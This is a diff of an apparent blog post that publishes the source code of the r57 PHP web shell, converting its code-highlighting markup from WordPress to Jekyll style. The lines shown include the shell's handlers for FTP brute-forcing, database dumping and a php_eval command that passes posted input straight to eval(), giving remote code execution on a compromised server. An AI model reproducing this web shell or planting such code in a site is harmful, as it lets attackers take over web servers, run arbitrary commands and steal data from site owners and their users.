@@ -16,7 +16,7 @@ I&#8217;m pretty sure the r57 and c99 shells are more or less the same, but this
 
 ### r57 Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 /******************************************************************************************************/
 /*										 WW.R57.GEN.TR
 /*                                     #    #        #    #
@@ -1957,8 +1957,8 @@ if ($_POST['cmd']=="ftp_brute")
  echo $lang[$language.'_text98'].$suc."\r\n";
  }
 if ($_POST['cmd']=="php_eval"){
- $eval = @str_replace("&lt;?","",$_POST['php_eval']);
- $eval = @str_replace("?&gt;","",$eval);
+ $eval = @str_replace("<?","",$_POST['php_eval']);
+ $eval = @str_replace("?>","",$eval);
  @eval($eval);}
 if ($_POST['cmd']=="mysql_dump")
  {
@@ -2204,5 +2204,5 @@ echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
 echo $te."&lt;/td&gt;".$fe."&lt;/tr&gt;&lt;/div&gt;&lt;/table&gt;";
 }
 echo '&lt;/table&gt;'.$table_up3."&lt;/div&gt;&lt;/div&gt;&lt;div align=center id='n'&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;o---[ r57.gen.tr v1.3- Thesaboarqe : R57&lt;a href=http://www.r57.gen.tr/&gt;www.r57.gen.tr/&lt;/a&gt; | version ".$version." ]---o&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;".$f;
-?&gt;
-</pre>
+?>
+{% endhighlight %}
